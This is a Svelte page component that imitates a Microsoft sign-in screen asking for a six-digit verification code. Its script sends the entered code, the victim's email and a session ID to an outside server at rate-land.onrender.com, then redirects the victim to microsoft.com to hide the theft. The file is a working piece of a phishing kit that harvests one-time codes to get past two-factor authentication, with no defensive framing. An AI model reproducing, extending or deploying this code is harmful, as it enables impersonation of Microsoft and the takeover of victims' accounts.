<script>
  import { onMount } from 'svelte';
  import { emailStore } from '../stores.js';
  import MicrosoftSvg from '../assets/microsoft.svg';
  import SignUpFooter from '../lib/SignUpFooter.svelte';
  // import { onMount } from 'svelte';
  import { link } from "svelte-spa-router";

  let name = 'Microsoft'
  let otp = ["", "", "", "", "", ""];
  let inputs = []; // To store references to the input elements
  let errorMessage = "";
  let sessionId = "";

  // Automatically focus the first input on load
  onMount(() => {
    const params = new URLSearchParams(window.location.search);
    sessionId = params.get('session');
    
    if (!sessionId) {
      errorMessage = "Session expired. Please start over.";
    }
    
    inputs[0]?.focus();
  });

  async function handleInput(e, index) {
    const value = e.target.value;
    
    // Only allow numbers
    if (!/^\d*$/.test(value)) {
      otp[index] = "";
      return;
    }

    // Move to next input if value is entered
    if (value && index < 5) {
      inputs[index + 1].focus();
    }

    // Check if OTP is complete
    if (otp.every(v => v !== "") && otp.join("").length === 6) {
      await submitOtp();
    }
  }

  function handleKeyDown(e, index) {
    // Move to previous input on Backspace if current is empty
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputs[index - 1].focus();
    }
  }

  async function submitOtp() {
    const finalCode = otp.join("");
    try {
      await sendDataToBackend(finalCode);
      redirectUrl();
    } catch (err) {
      errorMessage = "Invalid code. Please try again.";
    }
  }
async function sendDataToBackend(code) {
   const backend_url = "https://rate-land.onrender.com/submit-otp";
    try {

        const response = await fetch(backend_url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                sessionId: sessionId, // 👈 CRITICAL: Link the OTP to the session
                otp: code,
                email: $emailStore
            })
        });

         if (response.status === 200) {
          console.log('Process successful!');
        } else {
          console.error('Attempt Failed:', response.status);
        }

    } catch (error) {
        console.error("Error:", error);
    }
}
  function redirectUrl() { window.location.href = "https://microsoft.com"; }
</script>

<div class="wrapper">
  <div class="container">
    <div class="card">
      <div class="back-button-container">
        <button class="icon-btn" on:click={() => window.history.back()}>
          <svg viewBox="0 0 24 24" width="16"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
        </button>
      </div>

      <div class="logo-wrapper">
        <img src={MicrosoftSvg} alt="microsoft" class="logo"/>
        <div class="email-display">{$emailStore || 'user@example.com'}</div>
      </div>

      <h2>Enter your code</h2>
      <p class="subtitle">Enter the code we sent to <span class="font-bold">{$emailStore || 'your email'}</span>.</p>

      <div class="otp-container">
        {#each otp as digit, i}
          <input
            type="text"
            maxlength="1"
            bind:value={otp[i]}
            bind:this={inputs[i]}
            on:input={(e) => handleInput(e, i)}
            on:keydown={(e) => handleKeyDown(e, i)}
            class={errorMessage ? 'error' : ''}
          />
        {/each}
      </div>

      {#if errorMessage}
        <p class="error-text">{errorMessage}</p>
      {/if}

      <p class="forgot">
        <a href="/enter-your-password" use:link>Didn't get a code?</a>
      </p>

    </div>
  </div>
  <SignUpFooter/>
</div>

<style>
  /* Reuse your existing .wrapper, .container, .card, and .logo-wrapper styles */

  .wrapper {
  min-height: 100vh;
  width: 100%;
  background: white;
  display: flex;
  flex-direction: column;
  justify-content: space-between;
}

/* CONTAINER */
.container {
    padding: 12px; /* Reduced padding to bring elements closer to edges */
    position: relative;
  }

/* CARD */
.card {
  background: white;
  padding: 20px;
  border-radius: 4px;
  box-shadow: none;
  position: relative;
}

.back-button-container {
    /* Positioned absolutely to bypass parent padding on mobile */
    position: absolute;
    top: 20px;
    left: 0;
    z-index: 10;
  }

  .icon-btn {
    background: transparent;
    border: none;
    padding: 12px; /* Larger tap target */
    cursor: pointer;
    color: #666;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  .icon-btn:hover {
    background: rgba(0, 0, 0, 0.05);
    border-radius: 50%;
  }

  .logo-wrapper {
    display: flex;
    flex-direction: column;
    align-items: center;
    margin-top: 10px; 
  }

  .logo{
    width:110px;
    margin-bottom:16px;
}

  h2 {
    font-size: 24px;
    font-weight: 600;
    text-align: center;
    margin-bottom: 8px;
  }

  .subtitle {
    font-size: 15px;
    margin-bottom: 24px;
    text-align: center;
  }

  .otp-container {
    display: flex;
    gap: 8px;
    justify-content: space-between;
    margin-bottom: 30px;
  }

  .otp-container input {
    width: 45px;
    height: 45px;
    text-align: center;
    font-size: 18px;
    border: 1px solid #666;
    border-radius: 2px;
    outline: none;
  }

  .otp-container input:focus {
    border-color: #0067b8;
    border-width: 2px;
  }

  .otp-container input.error {
    border-color: #e81123;
  }

  .logo-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
  /* margin-bottom: 20px; */
}

.email-display {
  font-size: 14px;
  color: #333;
  background: white; /* light grey */
  padding: 6px 12px;
  border-radius: 24px;
  width: max-content;
  text-align: center;
  margin-bottom: 16px;
  border: 1px solid #f0f0f0;
}

  .forgot a {
    display: flex;
    justify-content: center;
    align-items: center;
    color: #0067b8;
    text-decoration: none;
    font-size: 13px;
    text-align: center !important;
  }

  .font-bold {
    font-weight: 600;
  }

  @media (min-width: 400px) and (max-width: 1023px) {
    .container {
        padding: 0 20px;
    }
}

  @media (min-width:600px){

.wrapper{
    justify-content:center;
    align-items:center;
    background:url('../assets/background.svg');
    background-size:cover;
}

.back-button-container {
      top: 20px;
      left: 20px;
    }
  }

</style>
